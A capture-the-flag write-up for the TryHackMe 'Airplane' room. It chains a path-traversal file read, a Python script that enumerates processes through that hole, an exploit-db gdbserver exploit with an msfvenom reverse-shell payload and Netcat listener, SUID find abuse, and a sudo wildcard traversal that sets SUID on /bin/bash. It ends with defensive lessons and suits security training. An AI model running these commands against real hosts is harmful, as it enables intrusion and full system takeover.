# TryHackMe: Airplane
![](Attachment/banner.png)
**Room:** [https://tryhackme.com/room/airplane](https://tryhackme.com/room/airplane)

## 1. Reconnaissance and Port Scanning

I started by performing an Nmap scan to identify open ports, running services, and their versions.

```
nmap -A -vv 10.49.189.18 -sV -oN nmap
```

The scan identified the following services:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
```

The scan revealed SSH on port `22` and a web application running on port `8000`. The SSH service exposed its host keys, while the web server used Werkzeug with Python 3.8.10.
http://airplane.thm:8000/?page=index.html
A separate port scan identified three open TCP ports:

```
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 62
6048/tcp open  x11      syn-ack ttl 62
8000/tcp open  http-alt syn-ack ttl 62
```

Port `6048` was particularly interesting because it was identified as an X11 service. Further enumeration was required to determine which service was actually listening on this port.

## 2. Configure the Local Hostname

The web server redirected requests to `airplane.thm`. To access the application using this hostname, I added the target IP address to the local hosts file.

```
sudo nano /etc/hosts
```

I added the following entry:

```
IP     airplane.thm
```

I then accessed the application:

```
http://airplane.thm:8000/?page=index.html
```

![](Attachment/index.png)

## 3. Local File Inclusion (LFI)

While examining the web application, I noticed that the `page` parameter was used to load a page.

I tested whether the parameter was vulnerable to directory traversal by attempting to access `/etc/passwd`.

```
http://airplane.thm:8000/?page=../../../../../../etc/passwd
```

![](Attachment/passwd.png)
  

The file was successfully retrieved, confirming a Local File Inclusion (LFI) vulnerability.

The `/etc/passwd` file revealed two interesting usernames:

- `hudson`
    
- `carlos`
    

This vulnerability could also potentially be used to read other files accessible to the web application's process.

## 4. Enumerating Processes Through LFI

To understand the privileges and execution environment of the web application, I accessed its process status through the `/proc` filesystem.

```
http://airplane.thm:8000/?page=../../../../../../proc/self/status
```

The response contained the following information:

```
Name:   python3
Umask:  0022
State:  S (sleeping)
Tgid:   536
Ngid:   0
Pid:    536
...
...
```

The process name indicated that the application was running under Python. The process ID was `536`.

I then examined its command line:

```
/proc/536/cmdline
```

The output indicated that the application was started using:

```
/usr/bin/python3 app.py
```

This confirmed that the web application was running as a Python process.

## 5. Automating PID Enumeration

Instead of manually checking individual process IDs, I created a Python script to enumerate process command lines through the LFI vulnerability.

The script iterates through PIDs from `1` to `999`, requests each process's `cmdline` file, and displays non-empty responses.

```python
import requests
import time

# Configuration
TARGET_URL = "http://airplane.thm:8000/"
SLEEP_BETWEEN_REQUESTS = 0.05
PID_RANGE = range(1, 1000)
TRAVERSAL = "../../../../../../"

session = requests.Session()


def get_cmdline(pid):
    params = {
        "page": f"{TRAVERSAL}proc/{pid}/cmdline"
    }

    try:
        response = session.get(
            TARGET_URL,
            params=params,
            timeout=(5, 15)
        )

        # Decode response and replace actual null bytes
        content = response.content.replace(b"\x00", b" ")
        content = content.decode("utf-8", errors="replace").strip()

        # Ignore unsuccessful responses
        if response.status_code != 200:
            return

        # Filter out missing pages and empty responses
        if not content or "Page not found" in content:
            return

        # Display other results
        print(f"[*] Trying PID {pid} => {content}")

    except requests.RequestException as error:
        print(f"[!] PID {pid} => Request error: {error}")


def main():
    print("[*] Starting LFI PID enumeration")

    try:
        for pid in PID_RANGE:
            get_cmdline(pid)
            time.sleep(SLEEP_BETWEEN_REQUESTS)

    except KeyboardInterrupt:
        print("\n[!] Enumeration stopped.")

    finally:
        session.close()
        print("[*] Finished.")


if __name__ == "__main__":
    main()
```

I executed the script:
```
python pid.py
```

The enumeration revealed several interesting processes:
```
....
[*] Trying PID 382 => avahi-daemon: running [airplane.local]
[*] Trying PID 527 => /usr/bin/gdbserver 0.0.0.0:6048 airplane
[*] Trying PID 531 => /usr/bin/python3 app.py
....
```

**Key finding:** PID `527` was running `gdbserver` on `0.0.0.0:6048`, with `airplane` specified as its target program.

This identified the service listening on port `6048` and provided a potential path to remote code execution.

## 6. Exploiting the Exposed GDB Server

I searched for publicly available exploits related to `gdbserver`.
```
searchsploit gdbserver
```

![](Attachment/gdbserver.png)  
The search returned an exploit titled **GNU gdbserver 9.2 - Remote Command Execution (RCE)**.

I copied the exploit to my working directory:

```
searchsploit -m 50539
```

The output identified the following details:
```
Exploit: GNU gdbserver 9.2 - Remote Command Execution (RCE)
URL: https://www.exploit-db.com/exploits/50539
Path: /usr/share/exploitdb/exploits/linux/remote/50539.py
Codes: N/A
Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/Downloads/airplane/50539.py
```

The exploit's usage instructions described generating a Linux reverse-shell payload, starting a Netcat listener, and running the exploit against the exposed GDB server.

```python
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
```

### Generate the Payload

I generated the reverse-shell payload using `msfvenom`:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.128
```

### Execute the Exploit

I then executed the exploit against the GDB server:
```
python3 50539.py 10.49.178.32:6048 rev.bin
```

The exploit returned:
```
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

The output indicated that the exploit had sent the payload successfully. I checked my listener to interact with the resulting shell.

## 7. Stabilizing the Shell

After obtaining a shell, I upgraded it to a more interactive Bash session using Python's PTY functionality.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

These commands provided a more usable terminal for subsequent enumeration and privilege escalation.

## 8. Privilege Escalation to Carlos

With access to the target, I enumerated files with the SUID permission bit set.

```
find / -type f -perm -4000 2>/dev/null
```

The output included:

```
/usr/bin/find  
/usr/bin/sudo
/usr/bin/pkexec
...
```

The `/usr/bin/find` binary was particularly interesting because it had the SUID bit set.

I used `find` to spawn a shell while preserving the effective user ID:

```
find . -exec /bin/sh -p \; -quit
```

I verified the resulting privileges:
```
id
```

The output was:
```
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

The effective user ID was `1000`, belonging to `carlos`, even though the real user ID remained `hudson`.

This confirmed that the SUID-enabled `find` binary allowed me to execute commands with Carlos's effective privileges.

## 9. Retrieve the User Flag

After obtaining Carlos's effective privileges, I navigated to his home directory and retrieved the user flag.

```
cd /home/carlos
cat user.txt
```

**User flag:**
```
eebfca2ca5a2b8a56c46c781aeea7562
```

## 10. Generate an SSH Key Pair

I performed another SUID-file enumeration:
```
find / -type f -perm -4000 2>/dev/null
```

The output again included:

```
/usr/bin/find
/usr/bin/sudo
...
```

While operating in the shell, I generated an RSA SSH key pair named `pwn`:

```
ssh-keygen -t rsa -f pwn -b 4096 -C '' -N ''
```
 ![](Attachment/key.png)


I then displayed the private key:

```
cat pwn
```

The output began with:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC....
-----END OPENSSH PRIVATE KEY-----
```

I copied the key to my local machine.
On the local machine, I saved the key in a file named `pwd` and restricted its permissions:
```
nano pwd
chmod 600 pwd
```

  ![](Attachment/carlos.png)
  

The restrictive file permissions ensured that the SSH private key could be used without being rejected because of overly permissive access.

## 11. Enumerate Carlos's Sudo Permissions

After accessing the system as Carlos, I checked the commands that could be executed through `sudo`.

```
sudo -l
```

The output was:

```
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

The important entry was:

```
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

This indicated that Carlos could run Ruby scripts matching `/root/*.rb` as any user, including root, without entering a password.

The wildcard in the permitted path required further investigation.

## 12. Exploiting the Sudo Wildcard Misconfiguration

I tested the path behavior of the sudo rule and found that the following paths were accepted:

```
/root/script.rb ---> work
/root/subdir/script.rb ---> work
/root/../../../../../tmp/script.rb ---> work
```

The final path was particularly important because it referenced a Ruby script under `/tmp` through directory traversal.

I created a Ruby script:
```
nano /tmp/pwn.rb
```

I added the following code:
```ruby
#! /usr/bin/env ruby

system('chmod 4755 /bin/bash')
```

The script changes the permissions of `/bin/bash` to include the SUID bit.
I then made the script executable:
```
chmod 755 /tmp/pwn.rb
```

Next, I executed the script through the permitted `sudo` command:
```
sudo /usr/bin/ruby /root/../../../../tmp/pwn.rb
```

Because the Ruby process ran with root privileges, the command inside the script changed the permissions of `/bin/bash`.

## 13. Escalate to Root

With the SUID bit set on `/bin/bash`, I launched Bash in privileged mode:

```
/bin/bash -ip
```

I verified the resulting privileges:
```
bash-5.0# id
uid=1000(carlos) gid=1000(carlos) euid=0(root) groups=1000(carlos),27(sudo)
```

The output confirmed that the effective user ID was `0`, indicating root privileges.

I then navigated to the root directory and listed its contents:
```
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
```

Finally, I retrieved the root flag:

```
bash-5.0# cat root.txt
```

**Root flag:**
```
190dcbeb688ce5fe029f26a1e5fce002
```

## 14. Conclusion

The Airplane room demonstrated how multiple security misconfigurations can be chained to compromise a Linux host.

The attack path was:

1. **Reconnaissance:** Identified SSH, HTTP, and the service exposed on port `6048`.
    
2. **Local File Inclusion:** Exploited the `page` parameter to read local files.
    
3. **Process Enumeration:** Used `/proc` through LFI to identify the exposed GDB server.
    
4. **Initial Access:** Exploited the GDB server to obtain a shell.
    
5. **Privilege Escalation:** Abused the SUID-enabled `find` binary to obtain Carlos's effective privileges.
    
6. **User Flag:** Retrieved `user.txt` from Carlos's home directory.
    
7. **Sudo Enumeration:** Identified the overly permissive Ruby execution rule.
    
8. **Root Escalation:** Used the wildcard path behavior to execute a Ruby script that modified Bash permissions.
    
9. **Root Flag:** Obtained root privileges and retrieved `root.txt`.
    

**Key security lessons:**

- Validate user-controlled file paths to prevent directory traversal and Local File Inclusion.
    
- Avoid exposing debugging services such as GDB servers on unrestricted network interfaces.
    
- Remove unnecessary SUID permissions from system binaries.
    
- Restrict `sudo` rules to specific, trusted scripts rather than wildcard-based paths.
    
- Ensure privileged scripts and their parent directories cannot be modified by unprivileged users.
    
- Monitor sensitive file permissions and privileged process execution.
    

This assessment highlights how weaknesses in application input handling, exposed debugging services, and Linux privilege configurations can combine to produce complete system compromise.

---
**Another machine rooted, another lesson learned!**
